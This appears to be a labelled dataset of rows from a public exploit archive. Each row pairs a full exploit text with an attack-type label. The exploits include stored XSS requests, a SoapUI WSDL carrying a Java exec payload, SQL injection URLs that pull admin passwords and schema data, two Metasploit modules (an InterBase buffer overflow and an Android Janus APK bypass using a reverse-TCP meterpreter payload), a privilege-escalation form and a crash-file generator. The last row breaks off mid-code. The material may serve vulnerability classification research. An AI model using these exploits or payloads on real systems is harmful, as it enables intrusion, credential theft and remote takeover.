47583,"thrsrossi Millhouse-Project 1.414 - 'content' Persistent Cross-Site Scripting # Exploit Title: thrsrossi Millhouse-Project 1.414 - 'content' Persistent Cross-Site Scripting # Date: 2019-11-01 # Exploit Author: Cakes # Vendor Homepage: https://github.com/thrsrossi/Millhouse-Project # Software Link: https://github.com/thrsrossi/Millhouse-Project.git # Version: 1.414 # Tested on: CentOS 7 # CVE: N/A  # PoC for this XSS attack  POST /includes/add_comment_sql.php HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://TARGET/views/single_post.php?post_id=53 Content-Type: application/x-www-form-urlencoded Content-Length: 59 Cookie: PHPSESSID=0sqr9kui308rq66ol1uu5olb94; submenu1=block; showips=10; showurls=10; showreferers=10 Connection: close Upgrade-Insecure-Requests: 1 DNT: 1  content=%3Cscript%3Ealert%28%22TEST%22%29%3B%3C%2Fscript%3E",Persistent Cross-Site Scripting,1
30908,"SoapUI 4.6.3 - Remote Code Execution # Exploit Title: SoapUI Remote Code Execution # Date: 25.12.13 # Exploit Author: Barak Tawily # Vendor Homepage:  <http://www.soapui.org/> http://www.soapui.org/ # Software Link: <http://www.soapui.org/Downloads/download-soapui-pro-trial.html> http://www.soapui.org/Downloads/download-soapui-pro-trial.html # Version: vulnerable before 4.6.4 # Tested on: Windows, should work at Linux as well # CVE : CVE-2014-1202  I have been found remote code execution vulnerability in the SoapUI product, which allows me to execute a java code to the victim's computer via malicious WSDL/WADL file.  This vulnerability allows attacker to execute java code to any client's machine that will use my WSDL file and will try to send request to the remote server.  SoapUI allows the client execute code by entering a java code inside the following tag, the java code will be executed when the client will try to send request to the server:  ${=JAVA CODE};  Thus, an attacker can make a malicious WSDL file, determine a malicious java code as default value in one of the requests parameters, hence, when client uses  malicious WSDL file and will try to send a request the java code will be executed.  The attack flow is:  1.       The attacker makes a malicious web service with fake WSDL including the java payload that will be executed on the victim.  2.       The victim enters the soapUI program and will enter the malicious WSDL address.  3.       The victim decides to send a request to the server, and the java code executed on the victim's machine.  4.       The attacker succeed execute java code in the victim's machine, and will take over it.  This vulnerability was check on the version (4.6.3), a proof of concept video can be found at: http://www.youtube.com/watch?v=3lCLE64rsc0   <?xml version=""1.0""?> <definitions name=""StockQuote""              targetNamespace=""http://example.com/stockquote.wsdl""              xmlns:tns=""http://example.com/stockquote.wsdl""              xmlns:xsd1=""http://example.com/stockquote.xsd""              xmlns:soap=""http://schemas.xmlsoap.org/wsdl/soap/""              xmlns=""http://schemas.xmlsoap.org/wsdl/"">    <types>     <schema targetNamespace=""http://example.com/stockquote.xsd""             xmlns=""http://www.w3.org/2000/10/XMLSchema"">       <element name=""Payload"" default=""${=Runtime.getRuntime().exec('calc.exe')};"" type=""string"">         <complexType>           <all>             <element name=""tickerSymbol"" type=""string""/>           </all>         </complexType>       </element>       <element name=""TradePrice"">          <complexType>            <all>              <element name=""price"" type=""float""/>            </all>          </complexType>       </element>     </schema>   </types>    <message name=""GetLastTradePriceInput"">     <part name=""body"" element=""xsd1:Payload""/>   </message>    <message name=""GetLastTradePriceOutput"">     <part name=""body"" element=""xsd1:TradePrice""/>   </message>    <portType name=""StockQuotePortType"">     <operation name=""Malicious_Request"">       <input message=""tns:GetLastTradePriceInput""/>       <output message=""tns:GetLastTradePriceOutput""/>     </operation>   </portType>    <binding name=""Exploit"" type=""tns:StockQuotePortType"">     <soap:binding style=""document"" transport=""http://schemas.xmlsoap.org/soap/http""/>     <operation name=""Malicious_Request"">       <soap:operation soapAction=""http://example.com/GetLastTradePrice""/>       <input>         <soap:body use=""literal""/>       </input>       <output>         <soap:body use=""literal""/>       </output>     </operation>   </binding>    <service name=""StockQuoteService"">     <documentation>My first service</documentation>     <port name=""StockQuotePort"" binding=""tns:StockQuoteSoapBinding"">       <soap:address location=""http://example.com/stockquote""/>     </port>   </service>  </definitions>",Remote Code Execution,1
25053,"Siteman 1.1 - User Database Privilege Escalation (2) source: https://www.securityfocus.com/bid/12304/info   Siteman is reported prone to a vulnerability that may allow users to gain elevated privileges. This issue results from insufficient sanitization of user-supplied data.   Apparently, an attacker can supply additional lines to the stream used to write to the user database file through a URI parameter. This can allow the attacker to corrupt the user database file and potentially gain administrative privileges to the Siteman application.   Siteman 1.1.10 and prior versions are affected by this vulnerability.   <html> <b>These data were recorded.</b><br /><br /><table cellspacing=""0"" cellpadding=""2""><tr><td>Username(Use this, and not your display name, when logging in)</td><td align=""right"">amir452</td></tr><tr><td>Password</td><td align=""right""><form><select><option>Click to show password</option>                                          <option>amir452</option></select></form></td></tr><tr><td>Secret Question (Asked when you forget your password)</td><td align=""right"">amir452</td></tr><tr><td>Answer to secret question</td><td align=""right""><form> <select> <option>Click to show answer</option> <option>amir452</option> </select></form> </td></tr><tr><td>Display name</td><td align=""right"">amir452</td></tr><tr><td>Member Level</td><td align=""right""><b>5</b> (Admin)</td></tr><tr><td>email</td><td align=""right"">amir452@amir452.com</td></tr><tr><td>Hide my email adress</td><td align=""right"">no</td></tr><tr><td>Forum Signature</td><td align=""right"">hackers</td></table><br /><br />Is this correct?<br /><table cellspacing=""0"" cellpadding=""3""><tr><td>  <form action=""users.php?do=new"" method=""post""><input type=""submit"" value=""no"" /></form></td><td>  <form action=""http://www.example.com/users.php?do=docreate"" method=""post"">                                         <input type=""hidden"" name=""line"" value=""amir452|347a9a8a8d3f364f0bdb82c4208a3207|5|amir452@amir452.com|amir452|1105956827|amir452|347a9a8a8d3f364f0bdb82c4208a3207|0|0|0|hackers"" /><input type=""submit"" value=""yes"" /></form></html>",User Database Privilege Escalation,1
23843,"Belchior Foundry VCard 2.8 - Authentication Bypass source: https://www.securityfocus.com/bid/9910/info  It has been reported that vCard is prone to a remote authentication bypass vulnerability. This issue is due to a design error that would allow a malicious user access to certain admin functionality without having to first authenticate to the application.  This issue may be leveraged to manipulate the application database, potentially destroying data.  http://www.example.com/vcard/admin/uninstall.php http://www.example.com/vcard/admin/uninstall.php?step=2",remote authentication bypass,1
5803,"Pre News Manager 1.0 - 'id' SQL Injection ____________________   ___ ___ ________ \_   _____/\_   ___ \ /   |   \\_____  \    |    __)_ /    \  \//    ~    \/   |   \   |        \\     \___\    Y    /    |    \ /_______  / \______  /\___|_  /\_______  /         \/         \/       \/         \/                                           .OR.ID ECHO_ADV_97$2008  ----------------------------------------------------------------------------------------- [ECHO_ADV_97$2008] Pre News Manager <= 1.0 (index.php id) Sql Injection Vulnerability -----------------------------------------------------------------------------------------  Author         : M.Hasran Addahroni Date           : June, 13 th 2008 Location       : Jakarta, Indonesia Web            : http://e-rdc.org/v1/news.php?readmore=97 Critical Lvl   : Medium Impact	       : System access Where	       : From Remote ---------------------------------------------------------------------------  Affected software description: ~~~~~~~~~~~~~~~~~~~~~~~~~~~  Application   : Pre News Manager version       : <= 1.0 Vendor        : http://www.preproject.com/news.asp Description   :  Pre News Manager is online news publishing system. Very easy to manage and integration. Powerful online news management system with user friendly control panel. Include news box to any where in your website and integrate news manager in only one step. Upload latest news with images and advertisements. Include  HEADLINES page  to any where in your website and news will automatically updated to that page. Subscribe for latest and breaking news. Submit articles, news latest stories and many more. Add your own news categories. Also can be use for private news website.  ---------------------------------------------------------------------------  Vulnerability: ~~~~~~~~~~~~~  Input passed to the ""id"" parameter in index.php page is not properly verified before being used to sql query.  This can be exploited thru the browser and get password from admin in plain text. Successful exploitation requires that ""magic_quotes"" is off.   Poc/Exploit: ~~~~~~~~~  http://www.target.com/[path]/index.php?id=-1%20union%20select%201,2,3,concat(login,0x3a,password),5,6,7%20from%20admin--   Dork: ~~~~ Google    : ""To enjoy our newletter please register with us !""   Solution: ~~~~~~  - Edit the source code to ensure that input is properly verified. - Turn on magic_quotes in php.ini    Timeline: ~~~~~~~~  - 10 - 06 - 2008 bug found - 13 - 06 - 2008 vendor contacted - 13 - 06 - 2008 advisory released ---------------------------------------------------------------------------  Shoutz: ~~~~ ~ ping - my dearest wife, zautha my little warrior ""happy birthday, dear"" ~ y3dips,the_day,moby,comex,z3r0byt3,c-a-s-e,S`to,lirva32,pushm0v,az01,negative,the_hydra,neng chika, str0ke ~ everybody [at] SCAN-NUSANTARA and SCAN-ASSOSIATES ~ masterpop3,maSter-oP,Lieur-Euy,Mr_ny3m,bithedz,murp,sakitjiwa,x16,an0maly,cybertank,super_temon,b120t0,inggar,fachri,adi,rahmat,indra,cyb3rh3b ~ dr188le,SinChan,h4ntu,cow_1seng,poniman_coy,paman_gembul,ketut,rizal,cR4SH3R,kuntua,stev_manado,nofry,k1tk4t,0pt1c ~ newbie_hacker@yahoogroups.com ~ #aikmel #e-c-h-o @irc.dal.net  --------------------------------------------------------------------------- Contact: ~~~~~       K-159 || echo|staff || eufrato[at]gmail[dot]com      Homepage: http://www.e-rdc.org/  -------------------------------- [ EOF ] ----------------------------------  # milw0rm.com [2008-06-13]",SQL Injection,1
16839,"Borland Interbase - 'PWD_db_aliased()' Remote Buffer Overflow (Metasploit) ## # $Id: ib_pwd_db_aliased.rb 9669 2010-07-03 03:13:45Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##   require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote 	Rank = GoodRanking  	include Msf::Exploit::Remote::Tcp  	def initialize(info = {}) 		super(update_info(info, 			'Name'		=> 'Borland InterBase PWD_db_aliased() Buffer Overflow', 			'Description'	=> %q{ 				This module exploits a stack buffer overflow in Borland InterBase 				by sending a specially crafted attach request. 			}, 			'Version'	=> '$Revision: 9669 $', 			'Author'	=> 				[ 					'ramon', 					'Adriano Lima <adriano@risesecurity.org>', 				], 			'Arch'		=> ARCH_X86, 			'Platform'	=> 'linux', 			'References'	=> 				[ 					[ 'CVE', '2007-5243' ], 					[ 'OSVDB', '38607' ], 					[ 'BID', '25917' ], 					[ 'URL', 'http://www.risesecurity.org/advisories/RISE-2007002.txt' ], 				], 			'Privileged'	=> true, 			'License'	=> MSF_LICENSE, 			'Payload'	=> 				{ 					'Space' => 512, 					'BadChars' => ""\x00\x2f\x3a\x40\x5c"", 				}, 			'Targets'	=> 				[ 					# 0x0804cbe4 pop esi; pop ebp; ret 					[ 						'Borland InterBase LI-V8.0.0.53 LI-V8.0.0.54 LI-V8.1.0.253', 						{ 'Ret' => 0x0804cbe4 } 					], 				], 			'DefaultTarget'	=> 0, 			'DisclosureDate'  => 'Oct 03 2007' 		))  		register_options( 			[ 				Opt::RPORT(3050) 			], 			self.class 		)  	end  	def exploit  		connect  		# Attach database 		op_attach = 19  		length = 1152 		remainder = length.remainder(4) 		padding = 0  		if remainder > 0 			padding = (4 - remainder) 		end  		buf = ''  		# Operation/packet type 		buf << [op_attach].pack('N')  		# Id 		buf << [0].pack('N')  		# Length 		buf << [length].pack('N')  		# It will return into this nop block 		buf << make_nops(length - payload.encoded.length - 4)  		# Payload 		buf << payload.encoded  		# Target 		buf << [target.ret].pack('V')  		# Padding 		buf << ""\x00"" * padding  		# Length 		buf << [1024].pack('N')  		# Random alpha data 		buf << rand_text_alpha(1024)  		sock.put(buf)  		handler  	end  end",Remote Buffer Overflow,1
40742,"Adobe Connect 9.5.7 - Cross-Site Scripting Document Title: =============== Adobe Connect & Desktop v9.5.7 - Persistent Vulnerability   References (Source): ==================== http://www.vulnerability-lab.com/get_content.php?id=1838  Security ID: PSIRT-5180  Bulletin: https://helpx.adobe.com/security/products/connect/apsb16-35.html  http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-7851  Public News Article: http://www.securityweek.com/adobe-patches-9-flash-player-flaws-reported-zdi   CVE-ID: ======= CVE-2016-7851   Release Date: ============= 2016-11-09   Vulnerability Laboratory ID (VL-ID): ==================================== 1838   Common Vulnerability Scoring System: ==================================== 3.7   Product & Service Introduction: =============================== Whether it is a smartphone or tablet app, a game, a video, a digital magazine, a website, or an online experience, chances are that it was touched by Adobe technology. Our tools and services enable our customers to create groundbreaking digital content, deploy it across media and devices, and then continually measure and optimize it based on user data. By providing complete solutions that combine digital media creation with data-driven marketing, we help businesses improve their communications, strengthen their brands, and ultimately achieve greater business success.  (Copy of the Vendor Homepage: http://www.adobe.com/aboutadobe/)   Abstract Advisory Information: ============================== The vulnerability laboratory core research team discovered an application-side vulnerability in the Adobe Connect online web-application and v9.5.6 windows software.   Vulnerability Disclosure Timeline: ================================== 2016-04-27: Researcher Notification & Coordination (Benjamin Kunz Mejri - Evolution Security GmbH) 2016-04-28: Vendor Notification (PSIRT Adobe Security Team) 2016-04-29: Vendor Response/Feedback (PSIRT Adobe Security Team) 2016-10-20: Vendor Fix/Patch (Adobe Service Developer Team) 2016-11-08: Security Acknowledgements (Adobe Security Team) 2016-11-09: Public Disclosure (Vulnerability Laboratory)   Discovery Status: ================= Published   Affected Product(s): ==================== Adobe Systems Product: Adobe Connect - Online Service (Web-Application) 2016 Q2   Exploitation Technique: ======================= Remote   Severity Level: =============== Medium   Technical Details & Description: ================================ An application-side input validation and xss vulnerability has been discovered in the Adobe Connect online web-application and v9.5.6 windows software. The input validation and filter issue allows remote attackers to inject own malicious script codes to the server-side of the vulnerable modules context.  The vulnerability is located in the `firstname`,`lastname` and `companyname` parameter of the `event_registration.html` file submit POST method request.  Remote attackers are able to inject own malicious script codes in the vulnerable parameters POST method request to manipulate the adobe connect events  service emails for the webinar registration module. The email body does not encode the input values and the registration is not restricted on inputs as  well, which results in the application-side script code execution. Attackers are also able to followup the webinar links with the injected credentials  which may be result in a second persistent script code execution as well. The injection point is the registration input form of the webinar in adobe  connect and the execution point occurs in the email body context of the admin@adobeconnect.com email address.  The security risk of the persistent input validation web vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.8.  Exploitation of the persistent input validation web vulnerability requires a low privilege web-application user account and low user interaction.  Successful exploitation of the vulnerability results in session hijacking, persistent phishing attacks, persistent redirect to external sources  and persistent manipulation of affected or connected service module context.  Request Method(s): Inject 				[+] POST  Vulnerable Module(s): 				[+] Events - Webinar Registration Form  Vulnerable File(s): 				[+] event_registration.html  Vulnerable Parameter(s): 				[+] firstname 				[+] lastname 				[+] companyname  Affected Module(s): 				[+]  (admin@adobeconnect.com)   Proof of Concept (PoC): ======================= The persistent vulnerability can be exploited by remote attackers without privileged web-application user account and with low user interaction. For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.   Manual steps to reproduce the vulnerability ... 1.  Open your mailbox and click to the portals webinar email for administrators 2.  Surf to the signup registration of adobe connect next to the events reck 3.  Inject to the firstname, lastname and companyname your own script code payload 4.  Submit the POST request to get activated for the webinar to hackerone via adobe connect 5.  Check the local input of the registered account 6.  The script code payloads of the name values are replied by the email service without secure encode Note: The execution of the payloads occurs directly after the arrival and view 7.  Now choose in the email the link to the webinar that is connected to the name values 8.  Join the channel and write a message for interaction 9.  The code executes in several sections of the webinar adobe connect events service with persistent vector 10. Successful reproduce of the both application-side vulnerabilities in adobe via hackerone!   PoC: event_registration.html <div style=""font-size: 12pt;color: #1d1d1d;font-family: Tahoma;font-style: normal;background-color: #FFFFFF;"">  <p>>""<[PERSISTENT INJECTED SCRIPT CODE VULNERABILITY!]></p>  <p>We are pleased to confirm your registration for The Art and Science of Bug Bounty Triage - April 28, 2016. We look forward to your participation in the event.</p>  </div>   --- PoC Session Logs [POST] --- Status: 200[OK] POST https://events-na1.adobeconnect.com/content/connect/connect-action?sco-id=2159915051  Mime Type[text/html]    Request Header:       Host[events-na1.adobeconnect.com]       User-Agent[Mozilla/5.0 (Windows NT 6.3; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0]       Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]       Accept-Language[de,en-US;q=0.7,en;q=0.3]       Accept-Encoding[gzip, deflate, br]       Referer[https://events-na1.adobeconnect.com/content/connect/c1/2152090704/en/events/event/shared/2159889590/event_registration.html?sco-id=2159915051&campaign-id=DG-EM-Art%20of%20Triage-2Q2016-2&_charset_=utf-8]       Cookie[2159915051_campaign-id=DG-EM-Art%20of%20Triage-2Q2016-2; connectevent_campaign-id=DG-EM-Art%20of%20Triage-2Q2016-2; BREEZESESSION=na1breezpuz9xczd47kqnkqt; time-zone=Europe%2FBerlin; s_cc=true; s_sq=acnapvtpyd8zd0ka1b3qdt5jp4i76%3D%2526pid%253Dhttps%25253A%25252F%25252Fevents-na1.adobeconnect.com%25252Fcontent%25252Fconnect%25252Fc1%25252F2152090704%25252Fen%25252Fevents%25252Fevent%25252Fshared%25252F2159889590%25252Fevent_registration.html%25253Fsco-id%25253D2159915051%252526campaign-id%25253DDG-EM-Art%25252520of%25252520Triage-2Q2016-2%252526_charset_%25253Dutf-8%2526oid%253Dfunctiononclick(event)%25257BregFormSubmit()%25253B%25257D%2526oidt%253D2%2526ot%253DA]       Connection[keep-alive]    POST-Daten:       2159915054[Yes]       2159915055[%22%3E%3C%22%3Cimg+src%3D%22x%22%3E%2520%2520%3E%22%3Ciframe+src%3Da%3E%2520%3Ciframe%3E+++%22%3E%3C%22%3Cimg+src%3D%22x%22%3E%2520%2520%3E%22%3Ciframe+src%3Da%3E%2520%3Ciframe%3E]       2159915056[%22%3E%3C%22%3Cimg+src%3D%22x%22%3E%2520%2520%3E%22%3Ciframe+src%3Da%3E%2520%3Ciframe%3E+++%22%3E%3C%22%3Cimg+src%3D%22x%22%3E%2520%2520%3E%22%3Ciframe+src%3Da%3E%2520%3Ciframe%3E]       2159915057[adasfaf+asfasdfasfasfasdfsdfs]       login[bkm%40evolution-sec.com]       first-name[%3E%22%3Ciframe+src%3Da%3E%2520%3Ciframe%3E]       last-name[%3E%22%3Ciframe+src%3Da%3E%2520%3Ciframe%3E]       campaign-id[DG-EM-Art%2520of%2520Triage-2Q2016-2]       sco-id[2159915051]       reg-form-back[%2Fcontent%2Fconnect%2Fc1%2F2152090704%2Fen%2Fevents%2Fevent%2Fshared%2F2159889590%2Fevent_registration.html]       reg-form-success[%2Fcontent%2Fconnect%2Fc1%2F2152090704%2Fen%2Fevents%2Fevent%2Fshared%2F2159889590%2Fevent_registration.result.html]       action[event-register]       _charset_[UTF-8]       login-uri[%2Fcontent%2Fconnect%2Fc1%2F2152090704%2Fen%2Fevents%2Fevent%2Fshared%2F2159889590%2Fevent_registration.login.html%3Flogin-ok%3D%2Fcontent%2Fconnect%2Fc1%2F2152090704%2Fen%2Fevents%2Fevent%2Fshared%2F2159889590%2Fevent_registration.html%26sco-id%3D2159915051]       set-lang[en]       reg-confirm-page[%2Fcontent%2Fconnect%2Fc1%2F2152090704%2Fen%2Fevents%2Fevent%2Fshared%2F2159889590%2Fregistration_confirm.html]    Response Header:       Connection[Keep-Alive]       Server[Day-Servlet-Engine/4.1.24]       Content-Type[text/html;charset=UTF-8]       Date[Wed, 27 Apr 2016 08:56:07 GMT]       Transfer-Encoding[chunked]       Set-Cookie[2159915051_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connectconnectevent_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connect  2159915051_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connect connectevent_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connect 2159915051_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connect connectevent_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connect 2159915051_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connect connectevent_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connect 2159915051_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connect connectevent_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connect 2159915051_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connect connectevent_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connect 2159915051_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connect connectevent_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connect 2159915051_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connect connectevent_campaign-id=DG-EM-Art%2520of%2520Triage-2Q2016-2; Path=/content/connect]   Reference(s): https://events-na1.adobeconnect.com/ https://events-na1.adobeconnect.com/content/ https://events-na1.adobeconnect.com/content/connect/ https://events-na1.adobeconnect.com/content/connect/connect-action   Solution - Fix & Patch: ======================= The vulnerability can be patched by a secure parse and encode of the vulnerable firstname, lastname and companyname input fields in  the registration file POST method request. Dissallow the usage of special chars and restrict the input to prevent further script code injection attacks. Encode the email body context of the adobe connect service mails after the registration. Block script code tags or escape and encode them as well.  Please follow the instructions in the adobe security bulletin to resolve the issue - Adobe Connect 	9.5.7 windows desktop version. URL: https://helpx.adobe.com/adobe-connect/release-note/adobe-connect-9-5-7-release-notes.html   Security Risk: ============== The security risk of the application-side vulnerability in the events webinar web-application and windows desktop software is estimated as medium. (CVSS 3.7)   Credits & Authors: ================== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (research@vulnerability-lab.com) [http://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.]   Disclaimer & Information: ========================= The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or implied,  including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any case of damage,  including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab or its suppliers have been advised  of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing  limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface websites, hack into databases or trade with stolen data.  Domains:    www.vulnerability-lab.com 		- www.vuln-lab.com 						- www.evolution-sec.com Contact:    admin@vulnerability-lab.com 	- research@vulnerability-lab.com 				- admin@evolution-sec.com Section:    magazine.vulnerability-lab.com 	- vulnerability-lab.com/contact.php 				- evolution-sec.com/contact Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to electronically  redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by Vulnerability-Lab Research Team or  its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark of vulnerability-lab team & the specific  authors or managers. To record, list, modify, use or edit our material contact (admin@ or research@vulnerability-lab.com) to get a ask permission.  				    Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™  --  VULNERABILITY LABORATORY - RESEARCH TEAM SERVICE: www.vulnerability-lab.com",Cross-Site Scripting,1
45768,"Yot CMS 3.3.1 - 'aid' SQL Injection # Exploit Title: Yot CMS 3.3.1 - 'aid' SQL Injection # Dork: N/A # Date: 2018-11-01 # Exploit Author: Ihsan Sencan # Vendor Homepage: https://yot.sourceforge.io/ # Software Link: https://ayera.dl.sourceforge.net/project/yot/Yot%203.3.1.zip # Version: 3.3.1 # Category: Webapps # Tested on: WiN7_x64/KaLiLinuX_x64 # CVE: N/A  # POC:  # 1) # http://localhost/[PATH]/index.php?page=articles&op=art&aid=[SQL] #  GET /[PATH]/index.php?page=articles&op=art&aid=1++uniON+SElEcT++++0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c0x496873616e%2c(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(selEct(0)frOm(information_schema.COlumns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e),%200x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)--+- HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive HTTP/1.1 200 OK Date: Thu, 01 Nov 2018 23:21:17 GMT Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30 X-Powered-By: PHP/5.6.30 Set-Cookie: PHPSESSID=eatkahgi05mbjht042ipvtifp5; path=/ Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8  # POC:  # 2) # http://localhost/[PATH]/index.php?page=articles&op=cat&cid=[SQL] #  GET /[PATH]/index.php?page=articles&op=cat&cid=1++uniON+SElEcT++++0x496873616e%2c(select(@x)from(select(@x:=0x00),(@running_number:=0),(@tbl:=0x00),(selEct(0)frOm(information_schema.COlumns)where(table_schema=database())and(0x00)in(@x:=Concat(@x,0x3c62723e,if((@tbl!=table_name),Concat(0x3c2f6469763e,LPAD(@running_number:=@running_number%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d7265643e,@tbl:=table_name,0x3c2f666f6e743e,0x3c62723e,(@z:=0x00),0x3c646976207374796c653d226d617267696e2d6c6566743a333070783b223e),%200x00),lpad(@z:=@z%2b1,2,0x30),0x3a292020,0x3c666f6e7420636f6c6f723d626c75653e,column_name,0x3c2f666f6e743e))))x)--+- HTTP/1.1 Host: TARGET User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Cookie: PHPSESSID=eatkahgi05mbjht042ipvtifp5 Connection: keep-alive HTTP/1.1 200 OK Date: Thu, 01 Nov 2018 23:32:28 GMT Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30 X-Powered-By: PHP/5.6.30 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Transfer-Encoding: chunked Content-Type: text/html; charset=UTF-8",SQL Injection,1
14624,"JaMP Player 4.2.2.0 - Denial of Service # Exploit Title: JaMP Player v4.2.2.0 (.m3u) DoS # Date: 12 / 8 / 2010 # Author: Oh Yaw Theng # Software Link: http://www.topdownloads.net/software/jamp-player_2_219088.html?hl=&ia=0 # Version: v4.2.2.0 # Tested on: Windows XP SP 2 # CVE : N / A  #!/usr/bin/python  filename = ""crash.m3u""  junk = ""\x41"" * 5000  exploit = junk  textfile = open(filename,'w') textfile.write(exploit) textfile.close()",Denial of Service,1
47601,"Android Janus - APK Signature Bypass (Metasploit) ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## require 'msf/core/payload/apk'  class MetasploitModule < Msf::Exploit::Local   Rank = ManualRanking    include Msf::Exploit::FileDropper   include Msf::Post::File   include Msf::Post::Android::Priv   include Msf::Payload::Android    def initialize(info={})     super( update_info( info, {       'Name'           => ""Android Janus APK Signature bypass"",       'Description'    => %q{         This module exploits CVE-2017-13156 in Android to install a payload into another         application. The payload APK will have the same signature and can be installed         as an update, preserving the existing data.         The vulnerability was fixed in the 5th December 2017 security patch, and was         additionally fixed by the APK Signature scheme v2, so only APKs signed with         the v1 scheme are vulnerable.         Payload handler is disabled, and a multi/handler must be started first.       },       'Author'         => [         'GuardSquare', # discovery         'V-E-O',       # proof of concept         'timwr',       # metasploit module         'h00die',      # metasploit module       ],       'References'     => [         [ 'CVE', '2017-13156' ],         [ 'URL', 'https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures' ],         [ 'URL', 'https://github.com/V-E-O/PoC/tree/master/CVE-2017-13156' ],       ],       'DisclosureDate' => 'Jul 31 2017',       'SessionTypes'   => [ 'meterpreter' ],       'Platform'       => [ 'android' ],       'Arch'           => [ ARCH_DALVIK ],       'Targets'        => [ [ 'Automatic', {} ] ],       'DefaultOptions' => {         'PAYLOAD' => 'android/meterpreter/reverse_tcp',         'AndroidWakelock' => false, # the target may not have the WAKE_LOCK permission         'DisablePayloadHandler' => true,       },       'DefaultTarget'  => 0,       'Notes' => {         'SideEffects' => ['ARTIFACTS_ON_DISK', 'SCREEN_EFFECTS'],         'Stability' => ['SERVICE_RESOURCE_LOSS'], # ZTE youtube app won't start anymore       }     }))     register_options([       OptString.new('PACKAGE', [true, 'The package to target, or ALL to attempt all', 'com.phonegap.camerasample']),     ])     register_advanced_options [       OptBool.new('ForceExploit', [false, 'Override check result', false]),     ]   end    def check     os = cmd_exec(""getprop 